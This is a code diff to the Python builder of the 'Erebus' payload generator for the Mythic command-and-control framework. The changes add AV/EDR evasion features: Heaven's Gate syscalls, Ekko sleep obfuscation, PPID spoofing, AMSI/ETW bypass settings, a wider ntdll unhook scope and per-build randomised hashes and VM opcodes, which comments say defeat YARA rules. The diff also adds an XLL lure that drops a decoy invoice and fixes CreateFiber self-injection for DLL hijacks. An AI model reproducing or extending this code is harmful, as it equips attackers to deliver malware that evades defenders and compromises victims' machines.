+                            syscall_backend={"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0),
                             callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                             callstack_spoof_modules=(
                                 parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                                 or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                             ),
-                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3, "Full Ekko": 4}.get(
                                 self.get_parameter("0.5p Sleep Obfuscation"), 0),
                             sleep_obfuscation_base_ms=int(self.get_parameter("0.5q Sleep Base MS") or 5000),
                             sleep_obfuscation_jitter_ms=int(self.get_parameter("0.5r Sleep Jitter MS") or 3000),
                             amsi_bypass_type=int(self.get_parameter("0.5s AMSI Bypass Type") or 1),
                             etw_bypass_type=int(self.get_parameter("0.5t ETW Bypass Type") or 1),
-                            unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 0),
+                            unhook_scope=int(self.get_parameter("0.5u Unhook Scope") or 1),
                             guardrails_check_uptime=guardrails_check_uptime,
                             guardrails_uptime_min_seconds=guardrails_uptime_min_sec,
                             guardrails_check_screen_resolution=guardrails_check_screen_res,
@@ -4485,7 +4917,7 @@ generated if none have been entered.""",
                         guardrails_check_sandbox=0,
                         guardrails_decoy_file="",
                         gr_block=gr_block_hijack,
-                        syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
+                        syscall_backend={"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0),
                         callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
                         callstack_spoof_modules=(
                             parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
@@ -4514,7 +4946,7 @@ generated if none have been entered.""",
                 # loader has unique hash values for GetProcAddress targets.
                 # Defeats family-level YARA pinned on fixed hash constants.
                 _hash_seed = f"0x{secrets.randbits(32):08X}"
-                _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                 _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                 cmd = [
                     "make",
@@ -4523,6 +4955,15 @@ generated if none have been entered.""",
                     f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
                     f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                     "TARGET=dll",
+                    # Hijack DLL is already running inside the victim - force
+                    # CreateFiber self-injection. Without this the Makefile
+                    # default (INJECTION_TYPE=3 / EarlyCascade) wins via its
+                    # -DCONFIG_INJECTION_TYPE define, which short-circuits the
+                    # `#ifndef CONFIG_INJECTION_TYPE` guard in config.hpp and
+                    # routes the loader into the remote CreateProcessW path
+                    # with an empty CONFIG_TARGET_PROCESS - the suspended
+                    # process spawn then fails and no shellcode runs.
+                    "INJECTION_TYPE=2",
                     f"EREBUS_HASH_SEED={_hash_seed}",
                     f"CONFIG_SYSCALL_BACKEND={_sw3}",
                     f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
@@ -4578,15 +5019,17 @@ generated if none have been entered.""",
                     else:
                         loader_format = self.get_parameter('0.2 Loader Format')
                         _hash_seed = f"0x{secrets.randbits(32):08X}"
-                        _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                        _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                         _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
-                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3, "Full Ekko": 4}.get(
                             self.get_parameter("0.5p Sleep Obfuscation"), 0)
                         _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
                         _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
                         _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
                         _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 1)
-                        _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 0)
+                        _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 1)
+                        _ppid_spoof = 1 if self.get_parameter("0.5 PPID Spoof") else 0
+                        _ppid_target = str(self.get_parameter("0.5 PPID Spoof Target") or "explorer.exe")
                         cmd = [
                             "make",
                             "-C",
@@ -4604,6 +5047,8 @@ generated if none have been entered.""",
                             f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
                             f"CONFIG_ETW_BYPASS_TYPE={_etw}",
                             f"CONFIG_UNHOOK_SCOPE={_unhook}",
+                            f"CONFIG_PPID_SPOOF={_ppid_spoof}",
+                            f"CONFIG_PPID_SPOOF_TARGET={_ppid_target}",
                             "all"
                         ]
                         if loader_format == "dll":
@@ -4612,6 +5057,54 @@ generated if none have been entered.""",
                         elif loader_format == "xll":
                             compile_step_name = "[T1559.002] - Compiling XLL Add-In"
                             compile_step_msg = "XLL Add-In Compiled!"
+
+                            # XLL File Ingestor: embed a legitimate document that is
+                            # dropped to %TEMP% and opened when xlAutoOpen fires.
+                            _xll_ingest_uuid = self.get_parameter("0.2b XLL Ingest File")
+                            if _xll_ingest_uuid:
+                                try:
+                                    _ingest_resp = await SendMythicRPCFileGetContent(
+                                        MythicRPCFileGetContentMessage(AgentFileId=_xll_ingest_uuid)
+                                    )
+                                    if _ingest_resp.Success and _ingest_resp.Content:
+                                        _ingest_bytes = _ingest_resp.Content
+
+                                        # Operator-chosen drop filename (e.g. "Q2_Invoice.xlsx").
+                                        _ingest_fname = (
+                                            self.get_parameter("0.2c XLL Ingest Filename") or "document.xlsx"
+                                        ).strip()
+                                        if not _ingest_fname:
+                                            _ingest_fname = "document.xlsx"
+
+                                        # Sanitise: no path separators, no quotes.
+                                        _ingest_fname = _ingest_fname.replace("/", "_").replace("\\", "_").replace('"', "")
+
+                                        # Convert bytes to C hex array and write
+                                        # the generated header (includes filename
+                                        # define so no shell-quoting gymnastics
+                                        # are needed on the make command line).
+                                        _hex_vals = ", ".join(f"0x{b:02X}" for b in _ingest_bytes)
+                                        _ingest_header = (
+                                            "#ifndef EREBUS_XLL_INGEST_FILE_HPP\n"
+                                            "#define EREBUS_XLL_INGEST_FILE_HPP\n"
+                                            "#pragma once\n"
+                                            "// Auto-generated by Erebus builder.py\n"
+                                            f'#define CONFIG_XLL_INGEST_FILENAME "{_ingest_fname}"\n'
+                                            f"static const unsigned char xll_ingest_file_data[] = {{ {_hex_vals} }};\n"
+                                            f"static const unsigned long xll_ingest_file_size   = {len(_ingest_bytes)};\n"
+                                            "#endif\n"
+                                        )
+                                        _ingest_hdr_path = (
+                                            Path(shellcode_loader_path) / "include" / "xll_ingest_file.hpp"
+                                        )
+                                        _ingest_hdr_path.write_text(_ingest_header)
+
+                                        cmd.insert(-1, "CONFIG_XLL_FILE_INGESTOR_ENABLED=1")
+                                        output += f"[+] XLL ingest file embedded: {_ingest_fname} ({len(_ingest_bytes)} bytes)\n"
+                                    else:
+                                        output += "[WARN] Failed to retrieve XLL ingest file content - ingestor disabled.\n"
+                                except Exception as _ie:
+                                    output += f"[WARN] XLL ingest file error: {_ie} - ingestor disabled.\n"
                         else:
                             compile_step_name = "[T1027] - Compiling Shellcode Loader"
                             compile_step_msg = "Shellcode Loader Compiled!"
@@ -4640,13 +5133,52 @@ generated if none have been entered.""",
                     loader_format = self.get_parameter('0.2 Loader Format')
                     build_config = self.get_parameter('0.3 Loader Build Configuration')
                     _hash_seed = f"0x{secrets.randbits(32):08X}"
-                    _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
-                    _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                    _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
+                    _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3, "Full Ekko": 4}.get(
                         self.get_parameter("0.5p Sleep Obfuscation"), 0)
                     inj = self.get_parameter('0.4a VM Loader - Injection Type') or "2"
+                    _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
+                    _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 0)
+                    _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 0)
+                    _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
+                    _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
+
+                    # Per-build randomised VM parameters.
+                    # VM_IR_SEED: 32-bit XOR key derivation seed.
+                    # VM_FWD_*: random permutation of [0..7] for opcode encoding.
+                    # VM_KEY_BASE_*: random 6-byte key derivation base.
+                    # All values passed to BOTH the embedded build step and the
+                    # final compile so vmloader_builder.cpp and vmloader.hpp use
+                    # identical parameters - seed mismatch = corrupted payload.
+                    _vm_seed  = f"0x{secrets.randbits(32):08X}U"
+                    import random as _rnd
+                    _vm_fwd   = list(range(8))
+                    _rnd.shuffle(_vm_fwd)
+                    _vm_key   = [secrets.randbits(8) for _ in range(6)]
+
+                    _vm_random_args = [
+                        f"VM_IR_SEED={_vm_seed}",
+                        f"VM_FWD_0={_vm_fwd[0]}",
+                        f"VM_FWD_1={_vm_fwd[1]}",
+                        f"VM_FWD_2={_vm_fwd[2]}",
+                        f"VM_FWD_3={_vm_fwd[3]}",
+                        f"VM_FWD_4={_vm_fwd[4]}",
+                        f"VM_FWD_5={_vm_fwd[5]}",
+                        f"VM_FWD_6={_vm_fwd[6]}",
+                        f"VM_FWD_7={_vm_fwd[7]}",
+                        f"VM_KEY_BASE_0={hex(_vm_key[0])}",
+                        f"VM_KEY_BASE_1={hex(_vm_key[1])}",
+                        f"VM_KEY_BASE_2={hex(_vm_key[2])}",
+                        f"VM_KEY_BASE_3={hex(_vm_key[3])}",
+                        f"VM_KEY_BASE_4={hex(_vm_key[4])}",
+                        f"VM_KEY_BASE_5={hex(_vm_key[5])}",
+                        f"VM_SLEEP_BASE_MS={_so_base}",
+                        f"VM_SLEEP_JITTER_MS={_so_jitt}",
+                    ]
 
                     embedded_proc = await asyncio.create_subprocess_exec(
                         "make", "-C", vmloader_path, "embedded",
+                        *_vm_random_args,
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.PIPE,
                     )
@@ -4673,6 +5205,10 @@ generated if none have been entered.""",
                         f"EREBUS_HASH_SEED={_hash_seed}",
                         f"CONFIG_SYSCALL_BACKEND={_sw3}",
                         f"CONFIG_SLEEP_OBFUSCATION_TYPE={_so_type}",
+                        f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
+                        f"CONFIG_ETW_BYPASS_TYPE={_etw}",
+                        f"CONFIG_UNHOOK_SCOPE={_unhook}",
+                        *_vm_random_args,
                         "all"
                     ]
                     if loader_format == "dll":
@@ -4784,133 +5320,251 @@ generated if none have been entered.""",
                 payload_final_name  = f"erebus_mac{_mac_out_ext}"
 
             # Execute compilation
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, stderr = await process.communicate()
-
-            if stdout:
-                output += f"[stdout]\n{stdout.decode(errors='replace')}"
-            if stderr:
-                output += f"[stderr]\n{stderr.decode(errors='replace')}"
-
-            # Handle compilation output
-            if payload_type == "Hijack":
-                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                payload_path = str(payload_path)
-                shutil.copy(dst=payload_path, src=payload_output_file)
-
-                # Skip PE sanitize + self-hunt on debug builds - see
-                # _finalize_pe_artifact for the rationale.
-                _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
-                output += _finalize_pe_artifact(
-                    payload_path,
-                    str(PurePath(agent_build_path) / "payload"),
-                    build_config=_hijack_build_config,
+            if mz_pe_mode:
+                # MZ header detected upstream - PE supplied directly, skip compilation.
+                loader_format = self.get_parameter("0.2 Loader Format") or "exe"
+                _pd = Path(agent_build_path) / "payload"
+                _pd.mkdir(parents=True, exist_ok=True)
+                payload_path = str(_pd / f"erebus.{loader_format}")
+                shutil.copy(src=str(mythic_shellcode_path), dst=payload_path)
+                response.status = BuildStatus.Success
+                response.build_message = "MZ PE supplied - skipping loader compilation"
+                await self._build_step(compile_step_name, "MZ PE detected - skipping loader compilation, using PE directly", success=True)
+            else:
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
                 )
+                stdout, stderr = await process.communicate()
 
-                if os.path.exists(payload_path):
-                    response.status = BuildStatus.Success
-                    response.build_message = "DLL Compiled!"
-                    response.build_stdout = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, compile_step_msg, success=True)
-                else:
-                    response.status = BuildStatus.Error
-                    response.payload = b""
-                    response.build_message = "Failed to compile DLL"
-                    response.build_stderr = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
-                    return response
+                if stdout:
+                    output += f"[stdout]\n{stdout.decode(errors='replace')}"
+                if stderr:
+                    output += f"[stderr]\n{stderr.decode(errors='replace')}"
 
-            elif payload_type == "Loader":
-                loader_type = self.get_parameter("0.1 Loader Type")
+                # Handle compilation output
+                if payload_type == "Hijack":
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
 
-                if loader_type == "Shellcode Loader":
-                    build_config = self.get_parameter('0.3 Loader Build Configuration')
+                    if process.returncode != 0:
+                        response.status = BuildStatus.Error
+                        response.payload = b""
+                        response.build_message = "Failed to compile DLL"
+                        response.build_stderr = output
+                        await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
+                        return response
 
-                    # Handle test build - create zip of all test payloads
-                    if build_config == "test":
-                        payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory
+                    shutil.copy(dst=payload_path, src=payload_output_file)
 
-                        output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
-                        output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"
+                    # Skip PE sanitize + self-hunt on debug builds - see
+                    # _finalize_pe_artifact for the rationale.
+                    _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
+                    output += _finalize_pe_artifact(
+                        payload_path,
+                        str(PurePath(agent_build_path) / "payload"),
+                        build_config=_hijack_build_config,
+                    )
 
-                        if payloads_dir.exists():
-                            files_in_dir = list(payloads_dir.iterdir())
-                            output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"
+                    if os.path.exists(payload_path):
+                        response.status = BuildStatus.Success
+                        response.build_message = "DLL Compiled!"
+                        response.build_stdout = output + "\n" + payload_path
+                        await self._build_step(compile_step_name, compile_step_msg, success=True)
+                    else:
+                        response.status = BuildStatus.Error
+                        response.payload = b""
+                        response.build_message = "Failed to compile DLL"
+                        response.build_stderr = output + "\n" + payload_path
+                        await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
+                        return response
 
-                        if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
+                elif payload_type == "Loader":
+                    loader_type = self.get_parameter("0.1 Loader Type")
+
+                    if loader_type == "Shellcode Loader":
+                        build_config = self.get_parameter('0.3 Loader Build Configuration')
+
+                        # Handle test build - create zip of all test payloads
+                        if build_config == "test":
+                            payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory
+
+                            output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
+                            output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"
+
+                            if payloads_dir.exists():
+                                files_in_dir = list(payloads_dir.iterdir())
+                                output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"
+
+                            if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
+                                response.status = BuildStatus.Error
+                                response.build_message = "Failed to compile test payloads"
+                                response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
+                                await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
+                                return response
+
+                            # Create agent_code/payloads directory for persistent storage
+                            agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
+                            agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)
+
+                            # Create zip file using shutil
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            zip_basename = f"test_payloads_{timestamp}"
+
+                            # Use shutil.make_archive to create zip (it adds .zip automatically)
+                            # This creates the zip in the parent directory of payloads_dir
+                            zip_archive_path = shutil.make_archive(
+                                base_name=str(payloads_dir.parent / zip_basename),
+                                format='zip',
+                                root_dir=str(payloads_dir.parent),
+                                base_dir=payloads_dir.name
+                            )
+
+                            output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
+                            output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"
+
+                            # Move the zip to agent_code/payloads
+                            final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
+                            shutil.move(zip_archive_path, str(final_zip_path))
+
+                            output += f"[DEBUG] Moved archive to: {final_zip_path}\n"
+
+                            # Also copy individual payloads to agent_code/payloads for easy access
+                            files_copied = 0
+                            for file in payloads_dir.iterdir():
+                                if file.is_file():
+                                    shutil.copy(file, agent_code_payloads_dir / file.name)
+                                    files_copied += 1
+
+                            output += f"[DEBUG] Copied {files_copied} individual files\n"
+
+                            if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
+                                response.status = BuildStatus.Success
+                                response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
+                                response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
+                                await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)
+
+                                # For test builds, read the zip and return it as the payload
+                                with open(final_zip_path, "rb") as f:
+                                    response.payload = f.read()
+                                response.updated_filename = f"{zip_basename}.zip"
+
+                                # Return early for test builds - skip containerization and other steps
+                                return response
+                            else:
+                                response.status = BuildStatus.Error
+                                response.build_message = f"Failed to create test payload zip"
+                                response.build_stderr = output + "\n" + str(final_zip_path)
+                                await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
+                                return response
+                        else:
+                            payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                            payload_path = str(payload_path)
+                            shutil.copy(dst=payload_path, src=payload_output_file)
+
+                            # build_config was resolved at the top of this
+                            # branch (Shellcode Loader, non-test). Threaded
+                            # into the finalizer so debug builds skip the
+                            # sanitizer/self_hunt pair.
+                            output += _finalize_pe_artifact(
+                                payload_path,
+                                str(PurePath(agent_build_path) / "payload"),
+                                build_config=build_config,
+                            )
+
+                            if os.path.exists(payload_path):
+                                response.status = BuildStatus.Success
+                                response.build_message = "Loader Compiled!"
+                                response.build_stdout = output + "\n" + payload_path
+                                await self._build_step(compile_step_name, compile_step_msg, success=True)
+                            else:
+                                response.status = BuildStatus.Error
+                                response.build_message = "Failed to compile loader"
+                                response.build_stderr = output + "\n" + payload_path
+                                await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
+                                return response
+
+                    elif loader_type == "ClickOnce":
+                        if process.returncode != 0:
                             response.status = BuildStatus.Error
-                            response.build_message = "Failed to compile test payloads"
-                            response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
-                            await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
+                            response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
+                            response.build_stderr = output
+                            await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
                             return response
 
-                        # Create agent_code/payloads directory for persistent storage
-                        agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
-                        agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)
+                        # Locate publish output
+                        build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
+                        publish_root = Path(clickonce_loader_path) / "bin" / build_config
 
-                        # Create zip file using shutil
-                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                        zip_basename = f"test_payloads_{timestamp}"
+                        publish_dir = None
+                        if publish_root.exists():
+                            for tfm_dir in publish_root.iterdir():
+                                if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
+                                    for rid_dir in tfm_dir.iterdir():
+                                        if rid_dir.is_dir():
+                                            candidate = rid_dir / "publish"
+                                            if candidate.exists():
+                                                publish_dir = candidate
+                                                break
+                                    if publish_dir:
+                                        break
 
-                        # Use shutil.make_archive to create zip (it adds .zip automatically)
-                        # This creates the zip in the parent directory of payloads_dir
-                        zip_archive_path = shutil.make_archive(
-                            base_name=str(payloads_dir.parent / zip_basename),
-                            format='zip',
-                            root_dir=str(payloads_dir.parent),
-                            base_dir=payloads_dir.name
-                        )
+                        if not publish_dir or not publish_dir.exists():
+                            response.status = BuildStatus.Error
+                            response.build_message = "Failed to locate ClickOnce publish output directory"
+                            response.build_stderr = output + f"\nSearched in: {publish_root}"
+                            await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
+                            return response
 
-                        output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
-                        output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"
+                        # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
+                        payload_dir = Path(agent_build_path) / "payload"
+                        payload_dir.mkdir(parents=True, exist_ok=True)
 
-                        # Move the zip to agent_code/payloads
-                        final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
-                        shutil.move(zip_archive_path, str(final_zip_path))
+                        CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
+                        for item in publish_dir.iterdir():
+                            if item.is_file() and item.name not in CLICKONCE_MAIN:
+                                dest_path = payload_dir / item.name
+                                shutil.copy2(str(item), str(dest_path))
 
-                        output += f"[DEBUG] Moved archive to: {final_zip_path}\n"
+                        output += f"[DEBUG] Cleaned publish artifacts:\n"
+                        for item in publish_dir.iterdir():
+                            if item.is_file():
+                                output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
 
-                        # Also copy individual payloads to agent_code/payloads for easy access
-                        files_copied = 0
-                        for file in payloads_dir.iterdir():
-                            if file.is_file():
-                                shutil.copy(file, agent_code_payloads_dir / file.name)
-                                files_copied += 1
+                        # Locate main executable and copy as erebus.exe / erebus.dll
+                        payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                        payload_path = str(payload_path)
 
-                        output += f"[DEBUG] Copied {files_copied} individual files\n"
+                        clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
+                        clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
 
-                        if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
+                        if clickonce_exe.exists():
+                            shutil.copy2(str(clickonce_exe), str(payload_path))
+                            response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                             response.status = BuildStatus.Success
-                            response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
-                            response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
-                            await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)
-
-                            # For test builds, read the zip and return it as the payload
-                            with open(final_zip_path, "rb") as f:
-                                response.payload = f.read()
-                            response.updated_filename = f"{zip_basename}.zip"
-
-                            # Return early for test builds - skip containerization and other steps
-                            return response
+                            response.build_message = "ClickOnce Loader compiled successfully!"
+                        elif clickonce_dll.exists():
+                            payload_path_dll = Path(payload_path).with_suffix(".dll")
+                            shutil.copy2(str(clickonce_dll), str(payload_path_dll))
+                            response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
+                            response.status = BuildStatus.Success
+                            response.build_message = "ClickOnce Loader compiled successfully!"
                         else:
                             response.status = BuildStatus.Error
-                            response.build_message = f"Failed to create test payload zip"
-                            response.build_stderr = output + "\n" + str(final_zip_path)
-                            await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
+                            response.build_message = "Failed to locate compiled ClickOnce executable"
+                            response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
+                            await self._build_step(compile_step_name, "Failed to locate executable", success=False)
                             return response
-                    else:
+
+                        await self._build_step(compile_step_name, compile_step_msg, success=True)
+
+                    elif loader_type == "VM Loader":
                         payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                         payload_path = str(payload_path)
                         shutil.copy(dst=payload_path, src=payload_output_file)
 
-                        # build_config was resolved at the top of this
-                        # branch (Shellcode Loader, non-test). Threaded
-                        # into the finalizer so debug builds skip the
-                        # sanitizer/self_hunt pair.
+                        build_config = self.get_parameter('0.3 Loader Build Configuration')
                         output += _finalize_pe_artifact(
                             payload_path,
                             str(PurePath(agent_build_path) / "payload"),
@@ -4919,138 +5573,40 @@ generated if none have been entered.""",
 
                         if os.path.exists(payload_path):
                             response.status = BuildStatus.Success
-                            response.build_message = "Loader Compiled!"
+                            response.build_message = "VM Loader Compiled!"
                             response.build_stdout = output + "\n" + payload_path
                             await self._build_step(compile_step_name, compile_step_msg, success=True)
                         else:
                             response.status = BuildStatus.Error
-                            response.build_message = "Failed to compile loader"
+                            response.build_message = "Failed to compile VM Loader"
                             response.build_stderr = output + "\n" + payload_path
-                            await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
+                            await self._build_step(compile_step_name, "Failed to Compile VM Loader", success=False)
                             return response
 
-                elif loader_type == "ClickOnce":
-                    if process.returncode != 0:
+                elif payload_type in ("Linux", "macOS"):
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
+
+                    if not os.path.exists(payload_output_file):
                         response.status = BuildStatus.Error
-                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
+                        response.build_message = f"Compilation failed - output not found: {payload_output_file}"
                         response.build_stderr = output
-                        await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
+                        await self._build_step(compile_step_name, f"Compilation failed", success=False)
                         return response
 
-                    # Locate publish output
-                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
-                    publish_root = Path(clickonce_loader_path) / "bin" / build_config
-
-                    publish_dir = None
-                    if publish_root.exists():
-                        for tfm_dir in publish_root.iterdir():
-                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
-                                for rid_dir in tfm_dir.iterdir():
-                                    if rid_dir.is_dir():
-                                        candidate = rid_dir / "publish"
-                                        if candidate.exists():
-                                            publish_dir = candidate
-                                            break
-                                if publish_dir:
-                                    break
-
-                    if not publish_dir or not publish_dir.exists():
-                        response.status = BuildStatus.Error
-                        response.build_message = "Failed to locate ClickOnce publish output directory"
-                        response.build_stderr = output + f"\nSearched in: {publish_root}"
-                        await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
-                        return response
-
-                    # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
-                    payload_dir = Path(agent_build_path) / "payload"
-                    payload_dir.mkdir(parents=True, exist_ok=True)
-
-                    CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
-                    for item in publish_dir.iterdir():
-                        if item.is_file() and item.name not in CLICKONCE_MAIN:
-                            dest_path = payload_dir / item.name
-                            shutil.copy2(str(item), str(dest_path))
-
-                    output += f"[DEBUG] Cleaned publish artifacts:\n"
-                    for item in publish_dir.iterdir():
-                        if item.is_file():
-                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
-
-                    # Locate main executable and copy as erebus.exe / erebus.dll
-                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                    payload_path = str(payload_path)
-
-                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
-                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
-
-                    if clickonce_exe.exists():
-                        shutil.copy2(str(clickonce_exe), str(payload_path))
-                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
-                        response.status = BuildStatus.Success
-                        response.build_message = "ClickOnce Loader compiled successfully!"
-                    elif clickonce_dll.exists():
-                        payload_path_dll = Path(payload_path).with_suffix(".dll")
-                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
-                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
-                        response.status = BuildStatus.Success
-                        response.build_message = "ClickOnce Loader compiled successfully!"
-                    else:
-                        response.status = BuildStatus.Error
-                        response.build_message = "Failed to locate compiled ClickOnce executable"
-                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
-                        await self._build_step(compile_step_name, "Failed to locate executable", success=False)
-                        return response
-
-                    await self._build_step(compile_step_name, compile_step_msg, success=True)
-
-                elif loader_type == "VM Loader":
-                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                    payload_path = str(payload_path)
                     shutil.copy(dst=payload_path, src=payload_output_file)
-
-                    build_config = self.get_parameter('0.3 Loader Build Configuration')
-                    output += _finalize_pe_artifact(
-                        payload_path,
-                        str(PurePath(agent_build_path) / "payload"),
-                        build_config=build_config,
-                    )
 
                     if os.path.exists(payload_path):
                         response.status = BuildStatus.Success
-                        response.build_message = "VM Loader Compiled!"
+                        response.build_message = compile_step_msg
                         response.build_stdout = output + "\n" + payload_path
